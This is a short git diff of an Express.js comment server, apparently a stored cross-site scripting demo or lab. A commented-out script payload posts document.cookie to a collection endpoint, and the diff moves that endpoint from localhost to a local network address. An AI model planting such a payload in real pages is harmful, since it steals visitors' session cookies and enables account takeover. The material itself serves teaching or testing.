@@ -11,7 +11,7 @@ var express = require ('express'),
   app = express (),
   counter = 1;
 
-  //<script>$.ajax({type: 'POST', data: JSON.stringify({userInfo: document.cookie}), contentType: 'application/json', url: 'http://localhost:8085/stored'});</script>
+  //<script>$.ajax({type: 'POST', data: JSON.stringify({userInfo: document.cookie}), contentType: 'application/json', url: 'http://192.168.0.103:8085/stored'});</script>
 
 //------------------CORS-----------------------------------------------------------/
   app.use(function(req, res, next) {
@@ -36,8 +36,9 @@ app
   .get ('/', function (req, res) {
     if (req.cookies) {
       for (var key in req.cookies) { key !== 'counter' ? res.clearCookie (key, {path: '/'}) : null; }
+      //for (var key in req.cookies) { res.clearCookie (key, {path: '/'}); }
     }
-    if (!req.cookies.counter) { res.cookie ('counter', counter++); console.log (counter); }
+    if (!req.cookies.counter) { res.cookie ('counter', counter++); }
 
     commentModel.find ({}, {comment: 1}, function (err, comments) {
       if (err) {return (res.sendStatus (500));}
